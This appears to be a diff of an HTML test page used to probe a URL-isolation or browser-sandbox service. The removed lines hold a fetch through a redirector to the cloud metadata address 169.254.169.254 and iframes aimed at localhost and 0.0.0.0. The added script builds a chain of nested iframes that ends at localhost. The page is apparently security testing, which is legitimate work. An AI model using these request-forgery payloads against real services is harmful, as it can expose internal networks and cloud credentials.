@@ -7,16 +7,23 @@
 </head>
 <body>
   <script>
-     alert(1);
-     const d = await fetch("http://nicob.net/redir-http-169.254.169.254:80-");
+     (function Perform() {
+    const dd = new URL(location.href);
+    const value = parseInt(dd.searchParams.get("dd"))
+
+    const frame = document.createElement("iframe");
+    if (value === 0) {
+        frame.src = "http://localhost:/"
+    } else {
+        dd.searchParams.set("dd", value-1);
+        frame.src = dd.toString();
+    }
+    document.body.appendChild(frame)
+})()
 </script>
    
   <h1>Test success</h1>
-  <iframe width="1000px" height="600px" src="https://urlisolation.com/page/url/https://urlisolation.com" />
-
-  <iframe width="1000px"  height="600px" src="https://urlisolation.com/page/url/http://localhost" />
-
-  <iframe width="1000px"  height="600px" src="https://urlisolation.com/page/url/http://0.0.0.0" />
+  
     
 </body>
 </html>
